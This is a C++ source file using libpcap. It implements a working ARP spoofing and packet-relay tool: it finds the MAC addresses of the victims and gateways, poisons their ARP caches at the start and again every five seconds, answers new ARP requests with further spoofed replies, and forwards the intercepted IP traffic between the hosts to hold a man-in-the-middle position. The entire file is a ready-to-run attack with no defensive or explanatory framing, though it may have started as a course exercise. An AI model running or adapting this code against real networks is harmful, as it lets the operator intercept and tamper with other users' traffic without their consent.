#include <cstdio>
#include <stdlib.h>
#include <string>
#include <pcap.h>
#include "ethhdr.h"
#include "iphdr.h"
#include "arphdr.h"
#include "get_mac_ip.h"
#include <vector>
#include <iostream>
#include <map>
#include <thread>

#define ARP_REQUEST 0x1
#define ARP_REPLY 0x2

struct ethheader
{
	uint8_t ether_dhost[6];
	uint8_t ether_shost[6];
	uint16_t ether_type;
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() 
{
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip2> <target ip2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void send_arp(pcap_t* handle, Mac eth_dmac, Mac eth_smac, Mac smac, Ip sip, Mac tmac, Ip tip, uint16_t op)
{
	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}
	

void relay_packet(pcap_t* handle, Mac dmac, Mac smac, const u_char* packet, pcap_pkthdr* header)
{
	u_char* new_packet = new u_char[header->caplen];
	memcpy(new_packet, packet, header->caplen);
	memcpy(new_packet, &dmac, 6);
	memcpy(new_packet + 6, &smac, 6);


	int res = pcap_sendpacket(handle, new_packet, header->caplen);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	delete[] new_packet;
}

void ping_arp(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, std::map<Ip, Mac> senders, std::map<Ip, Mac> targets, std::map<Ip, std::vector<Ip> >  sender_list, std::map<Ip, Ip> which_gateway)
{
	
	int count = 0;
	while(true) {
		//spoof senders
			for(auto& pair : senders) {
			send_arp(handle, pair.second, attacker_mac, attacker_mac, which_gateway[pair.first], Mac::nullMac(), pair.first, ARP_REQUEST);
		}

		//spoof targets
		for(auto& pair : targets) {
			for(int i = 0 ; i < sender_list[pair.first].size() ; i ++) {
				send_arp(handle, pair.second, attacker_mac, attacker_mac, sender_list[pair.first][i], Mac::nullMac(), pair.first, ARP_REQUEST);
			}
		}

		printf("spoofed every targets, senders ...(%d)\n", ++count);
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}


int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// find my mac, ip
	Mac attacker_mac = get_mac_address(argv[1]);
	Ip attacker_ip = get_ip_address(argv[1]);

	// ip - mac hash map
	std::map<Ip, Mac> senders;
	std::map<Ip, Mac> targets;

	// which gateway the sender is in
	std::map<Ip, Ip> which_gateway;

	// list of senders inside gateway
	std::map<Ip, std::vector<Ip> > sender_list;



	// find sender&target pair mac address
	for(int i = 2 ; i < argc ; i = i + 2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i + 1]);

		// define sender's gateway
		which_gateway.insert(std::make_pair(sender_ip, target_ip));

		// add sender into gateway's sender list
		sender_list[target_ip].push_back(sender_ip);

		// find sender mac(victim)
		send_arp(handle, Mac::broadcastMac(), attacker_mac, attacker_mac, attacker_ip, Mac::nullMac(), sender_ip, ARP_REQUEST);


		// capture packet
		while(true) {
			struct pcap_pkthdr* header;
			const u_char* packet;

			int res = pcap_next_ex(handle, &header, &packet);
			if(res == 0) continue;
			if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex error\n");
				break;
			}
			// handle arp
			EthHdr *eth = (EthHdr*)packet;
			if(eth->type() == 0x0806) {
				ArpHdr *arp = (ArpHdr*)(packet + sizeof(EthHdr));
				if(attacker_mac == arp->tmac() && sender_ip == arp->sip()) {
					senders.insert(std::make_pair(arp->sip(), arp->smac()));
					printf("inserted sender mac : %s\n", static_cast<std::string>(arp->smac()).c_str());
					break;
				}

			}
		}

		// find target mac(gateway)
		send_arp(handle, Mac::broadcastMac(), attacker_mac, attacker_mac, attacker_ip, Mac::nullMac(), target_ip, ARP_REQUEST);

		// capture packet
		while(true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if(res == 0) continue;
			if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex error\n");
				break;
			}
			// handle arp
			EthHdr *eth = (EthHdr*)packet;
			if(eth->type() == 0x0806) {
				ArpHdr *arp = (ArpHdr*)(packet + sizeof(EthHdr));
				if(attacker_mac == arp->tmac() && target_ip == arp->sip()) {
					targets.insert(std::make_pair(arp->sip(), arp->smac()));
					printf("inserted sender mac : %s\n", static_cast<std::string>(arp->smac()).c_str());
					break;
				}
			}
		}

	}


	// initial infect - sender
	for(auto& pair : senders) {
		send_arp(handle, pair.second, attacker_mac, attacker_mac, which_gateway[pair.first], Mac::nullMac(), pair.first, ARP_REQUEST);
	}

	// initial infect - target
	for(auto& pair : targets) {
		for(int i = 0 ; i < sender_list[pair.first].size() ; i ++) {
			send_arp(handle, pair.second, attacker_mac, attacker_mac, sender_list[pair.first][i], Mac::nullMac(), pair.first, ARP_REQUEST);
		}
	}
	
	
	/*
	 * define thread
	 * thread will send spoofing arp request to all senders and targets every 5 seconds
	 * */
	std::thread arp_thread = std::thread(ping_arp, handle, attacker_mac, attacker_ip, senders, targets, sender_list, which_gateway);

	
	while(true) {
		struct pcap_pkthdr* header;
		const u_char* packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0) continue;
		if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex error\n");
			break;
		}

		EthHdr* eth = (EthHdr*)packet;
		// validate
		if(eth->dmac() != attacker_mac) continue;

		//arp recover
		if(eth->type() == 0x0806) {
			ArpHdr *arp = (ArpHdr*)(packet + sizeof(EthHdr));
			// request
			if(arp->op() == 0x1) {
				printf("arp request from : %s  respoofing...\n", static_cast<std::string>(arp->sip()).c_str());
				send_arp(handle, arp->smac(), attacker_mac, attacker_mac, arp->tip(), arp->smac(), arp->sip(), ARP_REPLY);
			}
			continue;
		}

		if(eth->type() != 0x0800 && eth->type() != 0x86dd) continue;

		ipheader *ip = (ipheader*)(packet + sizeof(EthHdr));

		Ip src_ip = Ip(ntohl(ip->iph_sourceip.s_addr));
		Ip dst_ip = Ip(ntohl(ip->iph_destip.s_addr));
		// check if packet is from gateway

		if(senders.count(src_ip) > 0) {
			// relay to gateway
			relay_packet(handle, targets[which_gateway[src_ip]], attacker_mac, packet, header);
			
		}
		else {
			// relay to sender
			relay_packet(handle, senders[dst_ip], attacker_mac, packet, header);
		}

	}
	

	pcap_close(handle);
}
